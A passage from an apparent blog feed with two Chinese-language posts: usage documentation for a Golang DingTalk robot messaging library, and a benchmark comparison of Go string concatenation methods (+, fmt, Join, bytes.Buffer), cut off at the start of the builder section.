        <content type="html"><![CDATA[<h2 id="dingtalk"><a href="#dingtalk" class="headerlink" title="dingtalk"></a>dingtalk</h2><p>钉钉机器人消息封装——Golang</p><p>github：<a href="https://github.com/blinkbean/dingtalk">https://github.com/blinkbean/dingtalk</a></p><p>目前自定义机器人支持</p><ul><li>文本（text）</li><li>链接（link）</li><li>markdown</li><li>ActionCard<ul><li>整体跳转</li><li>独立跳转</li></ul></li><li>FeedCard</li></ul><p><a href="https://ding-doc.dingtalk.com/doc#/serverapi2/qf2nxq">机器人官方文档</a></p><ul><li>添加钉钉群：<strong>35451012</strong>，执行dingtalk_test.go测试方法可直接查看以下消息内容。</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="创建钉钉群机器人"><a href="#创建钉钉群机器人" class="headerlink" title="创建钉钉群机器人"></a>创建钉钉群机器人</h3><ol><li>选择添加<code>自定义</code>机器人。</li><li>安全设置<br> 共有关键词、加签、IP白名单三种设置，需要根据情况进行选择。<br> <img src="https://i.loli.net/2020/07/05/4XqHG2dOwo8StEu.jpg" alt="Xnip2020-07-05_15-55-24.jpg"></li><li>选择<code>自定义关键词</code>，这里设置的关键词在初始化机器人的时候会用到。</li></ol><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3>   <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> get github.com/blinkbean/dingtalk</span><br></pre></td></tr></tbody></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3>   <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// key 创建钉钉机器人需要设置的关键词，默认为`.`</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDingTalk</span><span class="params">(tokens []<span class="type">string</span>, key <span class="type">string</span>)</span></span> *dingTalk</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加签方式创建钉钉机器人</span></span><br><span class="line"><span class="comment">// 加签机器人 access_token和secret一一对应，在创建机器人是获取</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDingTalkWithSecret</span><span class="params">(tokens <span class="type">string</span>, secret <span class="type">string</span>)</span></span> *DingTalk</span><br></pre></td></tr></tbody></table></figure>   <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="string">"github.com/blinkbean/dingtalk"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> {</span><br><span class="line">    <span class="comment">// 单个机器人有单位时间内消息条数的限制，如果有需要可以初始化多个token，发消息时随机发给其中一个机器人。</span></span><br><span class="line">    <span class="keyword">var</span> dingToken = []<span class="type">string</span>{<span class="string">"7bd675b66646ba890046c2198257576470099e1bda0770bad7dd6684fb1e0415"</span>}</span><br><span class="line">    cli := dingtalk.InitDingTalk(dingToken, <span class="string">"."</span>)</span><br><span class="line">    cli.SendTextMessage(<span class="string">"content"</span>)</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h3 id="text类型"><a href="#text类型" class="headerlink" title="text类型"></a>text类型</h3><ul><li>方法及可选参数  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">SendTextMessage(content <span class="type">string</span>, opt ...atOption) <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选参数</span></span><br><span class="line"><span class="comment">// @所有人</span></span><br><span class="line">WithAtAll()</span><br><span class="line"></span><br><span class="line"><span class="comment">// @指定群成员</span></span><br><span class="line">WithAtMobiles(mobiles []<span class="type">string</span>)</span><br></pre></td></tr></tbody></table></figure></li><li>使用  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// at所有人</span></span><br><span class="line">cli.SendTextMessage(<span class="string">"content"</span>, WithAtAll())</span><br><span class="line"></span><br><span class="line"><span class="comment">// at指定群成员</span></span><br><span class="line">mobiles := []<span class="type">string</span>{<span class="string">"131********"</span>}</span><br><span class="line">cli.SendTextMessage(<span class="string">"content"</span>, WithAtMobiles(mobiles))</span><br></pre></td></tr></tbody></table></figure>  <img src="https://i.loli.net/2020/07/05/LXErbH1KiRGstQ7.jpg" alt="Xnip2020-07-05_10-46-59.jpg"></li></ul><h3 id="link类型"><a href="#link类型" class="headerlink" title="link类型"></a>link类型</h3><ul><li>方法  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">SendLinkMessage(title, text, picUrl, msgUrl <span class="type">string</span>) <span class="type">error</span></span><br></pre></td></tr></tbody></table></figure></li><li>使用  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cli.SendLinkMessage(title, text, picUrl, msgUrl)</span><br></pre></td></tr></tbody></table></figure>  <img src="https://i.loli.net/2020/07/05/wDG1sMPlU7XZQfr.jpg" alt="Xnip2020-07-05_10-25-33.jpg"></li></ul><h3 id="markdown类型"><a href="#markdown类型" class="headerlink" title="markdown类型"></a>markdown类型</h3><ul><li><p>方法及可选参数</p>  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line"><span class="comment">// text：markdown格式字符串</span></span><br><span class="line">SendMarkDownMessage(title, text <span class="type">string</span>, opts ...atOption) <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选参数 目前钉钉markdown格式消息不支持@（可能是钉钉的bug），所以以下可选参数暂时不生效。</span></span><br><span class="line"><span class="comment">// @所有人</span></span><br><span class="line">WithAtAll()</span><br><span class="line"></span><br><span class="line"><span class="comment">// @指定群成员</span></span><br><span class="line">WithAtMobiles(mobiles []<span class="type">string</span>)</span><br></pre></td></tr></tbody></table></figure></li><li><p>使用</p>  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cli.SendMarkDownMessage(title, text)</span><br></pre></td></tr></tbody></table></figure></li><li><p>Markdown进阶</p>  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 按行写入数组，增强markdown的可读性</span></span><br><span class="line">msg := []<span class="type">string</span>{</span><br><span class="line">    <span class="string">"### Link test"</span>,</span><br><span class="line">    <span class="string">"---"</span>,</span><br><span class="line">    <span class="string">"- &lt;font color=#00ff00 size=6&gt;红色文字&lt;/font&gt;"</span>,</span><br><span class="line">    <span class="string">"- content2"</span>,</span><br><span class="line">}</span><br><span class="line">cli.SendMarkDownMessageBySlice(<span class="string">"Markdown title"</span>, msg, WithAtAll())</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字体及颜色</span></span><br><span class="line">dm := DingMap()</span><br><span class="line">dm.Set(<span class="string">"颜色测试"</span>, H2)</span><br><span class="line">dm.Set(<span class="string">"失败：$$ 同行不同色 $$"</span>, RED)  <span class="comment">// 双$分隔</span></span><br><span class="line">dm.Set(<span class="string">"---"</span>, N)</span><br><span class="line">dm.Set(<span class="string">"金色"</span>, GOLD)</span><br><span class="line">dm.Set(<span class="string">"成功"</span>, GREEN)</span><br><span class="line">dm.Set(<span class="string">"警告"</span>, BLUE)</span><br><span class="line">dm.Set(<span class="string">"普通文字"</span>, N)</span><br><span class="line">cli.SendMarkDownMessageBySlice(<span class="string">"color test"</span>, dm.Slice())</span><br></pre></td></tr></tbody></table></figure><p>  <img src="https://i.loli.net/2020/07/05/7LScefCZIGnDjBV.jpg" alt="Xnip2020-07-05_10-27-33.jpg"><br>  <img src="https://i.loli.net/2020/07/26/PADJ5uqmfQht2cr.jpg" alt="Xnip2020-07-26_17-14-40.jpg"></p></li><li><p>点击DTMD链接发送消息</p><p>  点击’dtmdLink1’，自动发送’dtmdValue1’并@机器人，简化输入</p>  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建有序map</span></span><br><span class="line">dtmdOrderMap := DingMap().</span><br><span class="line">    Set(<span class="string">"dtmdOrderMap1"</span>, <span class="string">"dtmdValue1"</span>).</span><br><span class="line">    Set(<span class="string">"dtmdOrderMap2"</span>, <span class="string">"dtmdValue2"</span>).</span><br><span class="line">    Set(<span class="string">"dtmdOrderMap3"</span>, <span class="string">"dtmdValue3"</span>)</span><br><span class="line">err := dingTalkCli.SendDTMDMessage(<span class="string">"DTMD title"</span>, dtmdOrderMap)</span><br></pre></td></tr></tbody></table></figure><p>  <img src="https://i.loli.net/2020/11/02/1OqEr4HKZWapRgd.jpg" alt="Xnip2020-11-02_17-17-26.jpg"></p></li></ul><h3 id="ActionCard类型-独立跳转"><a href="#ActionCard类型-独立跳转" class="headerlink" title="ActionCard类型(独立跳转)"></a>ActionCard类型(独立跳转)</h3><ul><li>方法及可选参数  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">SendActionCardMessage(title, text <span class="type">string</span>, opts ...actionCardOption) <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选参数</span></span><br><span class="line"><span class="comment">// 标题</span></span><br><span class="line">WithCardSingleTitle(title <span class="type">string</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转地址</span></span><br><span class="line">WithCardSingleURL(url <span class="type">string</span>)</span><br></pre></td></tr></tbody></table></figure></li><li>使用  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cli.SendActionSingleMessage(title, text, WithCardSingleTitle(sTitle), WithCardSingleURL(url))</span><br></pre></td></tr></tbody></table></figure>  <img src="https://i.loli.net/2020/07/05/kKELHAlomndiO9I.jpg" alt="Xnip2020-07-05_10-28-57.jpg"></li></ul><h3 id="ActionCard类型-独立跳转-1"><a href="#ActionCard类型-独立跳转-1" class="headerlink" title="ActionCard类型(独立跳转)"></a>ActionCard类型(独立跳转)</h3><ul><li>方法及可选参数  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">SendActionCardMessage(title, text <span class="type">string</span>, opts ...actionCardOption) <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可选参数</span></span><br><span class="line"><span class="comment">// 按钮排列方向，默认水平</span></span><br><span class="line">WithCardBtnVertical()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 跳转按钮</span></span><br><span class="line">WithCardBtns(btns []ActionCardMultiBtnModel)</span><br><span class="line"></span><br><span class="line"><span class="comment">// ActionCardMultiBtnModel</span></span><br><span class="line"><span class="keyword">type</span> ActionCardMultiBtnModel <span class="keyword">struct</span> {</span><br><span class="line">    Title     <span class="type">string</span> <span class="string">`json:"title,omitempty"`</span></span><br><span class="line">    ActionURL <span class="type">string</span> <span class="string">`json:"actionURL,omitempty"`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li>使用  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">btns := []ActionCardMultiBtnModel{{</span><br><span class="line">    Title:     <span class="string">"test1"</span>,</span><br><span class="line">    ActionURL: testUrl,</span><br><span class="line">    },{</span><br><span class="line">    Title:     <span class="string">"test2"</span>,</span><br><span class="line">    ActionURL: testUrl,</span><br><span class="line">    },</span><br><span class="line">}</span><br><span class="line">cli.SendActionSingleMessage(title, text, WithCardBtns(btns))</span><br></pre></td></tr></tbody></table></figure>  <img src="https://i.loli.net/2020/07/05/t9GywHFSQUWCVDT.jpg" alt="Xnip2020-07-05_10-29-21.jpg"><br>  <img src="https://i.loli.net/2020/07/26/pEg7hotXZnsaJPV.jpg" alt="Xnip2020-07-26_17-14-56.jpg"></li></ul><h3 id="FeedCard类型"><a href="#FeedCard类型" class="headerlink" title="FeedCard类型"></a>FeedCard类型</h3><ul><li>方法  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 方法定义</span></span><br><span class="line">SendFeedCardMessage(feedCard []FeedCardLinkModel) <span class="type">error</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// FeedCardLinkModel</span></span><br><span class="line"><span class="keyword">type</span> FeedCardLinkModel <span class="keyword">struct</span> {</span><br><span class="line">    Title      <span class="type">string</span> <span class="string">`json:"title,omitempty"`</span></span><br><span class="line">    MessageURL <span class="type">string</span> <span class="string">`json:"messageURL,omitempty"`</span></span><br><span class="line">    PicURL     <span class="type">string</span> <span class="string">`json:"picURL,omitempty"`</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li><li>使用  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">links := []FeedCardLinkModel{</span><br><span class="line">    {</span><br><span class="line">        Title:      <span class="string">"FeedCard1."</span>,</span><br><span class="line">        MessageURL: testUrl,</span><br><span class="line">        PicURL:     testImg,</span><br><span class="line">    },</span><br><span class="line">    {</span><br><span class="line">        Title:      <span class="string">"FeedCard2"</span>,</span><br><span class="line">        MessageURL: testUrl,</span><br><span class="line">        PicURL:     testImg,</span><br><span class="line">    },</span><br><span class="line">    {</span><br><span class="line">        Title:      <span class="string">"FeedCard3"</span>,</span><br><span class="line">        MessageURL: testUrl,</span><br><span class="line">        PicURL:     testImg,</span><br><span class="line">    },</span><br><span class="line">}</span><br><span class="line">cli.SendFeedCardMessage(links)</span><br></pre></td></tr></tbody></table></figure>  <img src="https://i.loli.net/2020/07/05/F5WDLqyJ4Yzfj6A.jpg" alt="Xnip2020-07-05_10-30-02.jpg"></li></ul><h3 id="OutGoing"><a href="#OutGoing" class="headerlink" title="OutGoing"></a>OutGoing</h3><ul><li><p>消息格式</p>  <figure class="highlight json"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">{</span></span><br><span class="line">    <span class="attr">"atUsers"</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">{</span></span><br><span class="line">            <span class="attr">"dingtalkId"</span><span class="punctuation">:</span><span class="string">"$:LWCP_v1:$1h0bmSzcLCHncx0lCt3Bb/UVz7xv/8vh*"</span></span><br><span class="line">        <span class="punctuation">}</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"chatbotUserId"</span><span class="punctuation">:</span><span class="string">"$:LWCP_v1:$1h0bmSzcLCHncx0lCt3Bb/UVz7x/8vh*"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"conversationId"</span><span class="punctuation">:</span><span class="string">"cidkkCwvtlh1L0RmFuhmashi*=="</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"conversationTitle"</span><span class="punctuation">:</span><span class="string">"项目群"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"conversationType"</span><span class="punctuation">:</span><span class="string">"2"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"createAt"</span><span class="punctuation">:</span><span class="number">1595232438950</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"isAdmin"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"isInAtList"</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"msgId"</span><span class="punctuation">:</span><span class="string">"msgm/bJkKjTupFM7ZoRF/eKR*=="</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"msgtype"</span><span class="punctuation">:</span><span class="string">"text"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"sceneGroupCode"</span><span class="punctuation">:</span><span class="string">"project"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"senderId"</span><span class="punctuation">:</span><span class="string">"$:LWCP_v1:$x4wFOct/DGctv96o4IxxB*=="</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"senderNick"</span><span class="punctuation">:</span><span class="string">"blinkbean"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"sessionWebhook"</span><span class="punctuation">:</span><span class="string">"https://oapi.dingtalk.com/robot/sendBySession?session=6d69b333f243db32d42c11sda9de620*"</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"sessionWebhookExpiredTime"</span><span class="punctuation">:</span><span class="number">1595237839030</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">"text"</span><span class="punctuation">:</span><span class="punctuation">{</span></span><br><span class="line">        <span class="attr">"content"</span><span class="punctuation">:</span><span class="string">" outgoing"</span></span><br><span class="line">    <span class="punctuation">}</span></span><br><span class="line"><span class="punctuation">}</span></span><br></pre></td></tr></tbody></table></figure></li><li><p>Usage</p>  <figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">OutGoing</span><span class="params">(ctx *gin.Context)</span></span>{</span><br><span class="line">    cli := dingtalk.InitDingTalk([]<span class="type">string</span>{<span class="string">"***"</span>}, <span class="string">"."</span>)</span><br><span class="line">    msg, _ := cli.OutGoing(ctx.Request.Body)</span><br><span class="line">    <span class="comment">// 处理content</span></span><br><span class="line">    res := doSomeThing(msg.Text.Content)</span><br><span class="line"></span><br><span class="line">    textMsg := dingtalk.NewTextMsg(res)</span><br><span class="line">    ctx.Set(<span class="string">"respData"</span>, textMsg)</span><br><span class="line">    ctx.JSON(ctx.Writer.Status(), data)</span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-字符串高效拼接</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%AB%98%E6%95%88%E6%8B%BC%E6%8E%A5/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%AB%98%E6%95%88%E6%8B%BC%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><a href="https://zhuanlan.zhihu.com/p/48865454">原文链接</a></h2><p>在我们编程的时候，和字符串打交道是必不可少的，我们对数据库里文本的处理，Web文本的显示，文本数据的存储等都需要和字符串打交道，那么对于字符串来说，查找、拼接这些都是常用的操作，尤其是以拼接使用的比较多，比如把一个人的姓名和年龄拼接在一起显示。</p><p>在Go语言（golang）中，对于字符串的拼接处理有很多种方法，那么那种方法才是效率最高的呢？因为内存很贵、性能很重要，有时候不慎字符串的转换和拷贝，就可以把你的内存吃光，性能低下，不得不考虑。</p><p>一个例子<br>对于任何功能、性能、方法的研究，没有比例子更有说服力的啦。在这里，我们使用一个例子，来演示不同字符串的拼接方式，以及对应的性能分析。这个例子如下：</p><p>昵称:飞雪无情<br>博客:<a href="http://www.flysnow.org/">http://www.flysnow.org/</a><br>微信公众号:flysnow_org<br>在这个例子中，通过字符串拼接的方式，拼接出如上的内容，这里特别强调，在这个例子中，换行也是字符串拼接的一部分，因为我们要严格拼接出如上的内容。</p><p>+号拼接<br>这种拼接最简单，也最容易被我们使用，因为它是不限编程语言的，比如Go语言有，Java也有，它们是+号运算符，在运行时计算的。现在演示下这种拼接的代码，虽然比较简单。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">func StringPlus() string{</span><br><span class="line">    var s string</span><br><span class="line">    s+="昵称"+":"+"飞雪无情"+"\n"</span><br><span class="line">    s+="博客"+":"+"http://www.flysnow.org/"+"\n"</span><br><span class="line">    s+="微信公众号"+":"+"flysnow_org"</span><br><span class="line">    return s</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>我们可以自己写个用例测试下，可以打印出和我们例子中一样的内容。那么这种最常见的字符串拼接的方式性能怎么样的呢，我们测试下：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">func BenchmarkStringPlus(b *testing.B) {</span><br><span class="line">    for i:=0;i&lt;b.N;i++{</span><br><span class="line">        StringPlus()</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行go test -bench=. -benchmem 查看性能输出如下：</p><p>BenchmarkStringPlus-8   20000000    108 ns/op   144 B/op    2 allocs/op<br>每次操作需要108ns,进行2次内存分配，分配114字节的内存。</p><p>fmt 拼接<br>这种拼接，借助于fmt.Sprint系列函数进行拼接，然后返回拼接的字符串。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">func StringFmt() string{</span><br><span class="line">    return fmt.Sprint("昵称",":","飞雪无情","\n","博客",":","http://www.flysnow.org/","\n","微信公众号",":","flysnow_org")</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>为了演示，代码没有换行，可能在手机上影响阅读体验，见谅。它的性能我们也测试一下看看效果。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">func BenchmarkStringFmt(b *testing.B) {</span><br><span class="line">    for i:=0;i&lt;b.N;i++{</span><br><span class="line">        StringFmt()</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>运行查看测试结果：</p><p>BenchmarkStringFmt-8    5000000     385 ns/op   80 B/op     1 allocs/op<br>虽然每次操作内存分配只有1次，分配80字节也不多，但是每次操作耗时太长，性能远没有+号操作快。</p><p>Join 拼接<br>这个是利用strings.Join函数进行拼接，接受一个字符串数组，转换为一个拼接好的字符串。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">func StringJoin() string{</span><br><span class="line">    s:=[]string{"昵称",":","飞雪无情","\n","博客",":","http://www.flysnow.org/","\n","微信公众号",":","flysnow_org"}</span><br><span class="line">    return strings.Join(s,"")</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func BenchmarkStringJoin(b *testing.B) {</span><br><span class="line">    for i:=0;i&lt;b.N;i++{</span><br><span class="line">        StringJoin()</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>为了方便，把性能测试的代码放一起了，现在看看性能测试的效果。</p><p>BenchmarkStringJoin-8   10000000    177 ns/op   160 B/op    2 allocs/op<br>整体和+操作相差不了太多，大概低0.5倍的样子。</p><p><a href="http://www.flysnow.org/2018/10/28/golang-concat-strings-performance-analysis.html">http://www.flysnow.org/2018/10/28/golang-concat-strings-performance-analysis.html</a></p><p>Go语言字符串高效拼接（一） | 飞雪无情的博客</p><p>buffer 拼接<br>这种被用的也很多，使用的是bytes.Buffer进行的字符串拼接，它是非常灵活的一个结构体，不止可以拼接字符串，还是可以byte,rune等，并且实现了io.Writer接口，写入也非常方便。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">func StringBuffer() string {</span><br><span class="line">    var b bytes.Buffer</span><br><span class="line">    b.WriteString("昵称")</span><br><span class="line">    b.WriteString(":")</span><br><span class="line">    b.WriteString("飞雪无情")</span><br><span class="line">    b.WriteString("\n")</span><br><span class="line">    b.WriteString("博客")</span><br><span class="line">    b.WriteString(":")</span><br><span class="line">    b.WriteString("http://www.flysnow.org/")</span><br><span class="line">    b.WriteString("\n")</span><br><span class="line">    b.WriteString("微信公众号")</span><br><span class="line">    b.WriteString(":")</span><br><span class="line">    b.WriteString("flysnow_org")</span><br><span class="line">    return b.String()</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">func BenchmarkStringBuffer(b *testing.B) {</span><br><span class="line">    for i:=0;i&lt;b.N;i++{</span><br><span class="line">        StringBuffer()</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>看看他的性能，运行输出即可：</p><p>BenchmarkStringBuffer-8     5000000     291 ns/op   336 B/op    3 allocs/op<br>好像并不是太好,和最差的fmt拼接差不多，和+号，Join拼接差好远，内存分配也比较多。每次操作耗时也很长。</p><p>builder 拼接<br>为了改进buffer拼接的性能，从go 1.10 版本开始，增加了一个builder类型，用于提升字符串拼接的性能。它的使用和buffer几乎一样。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 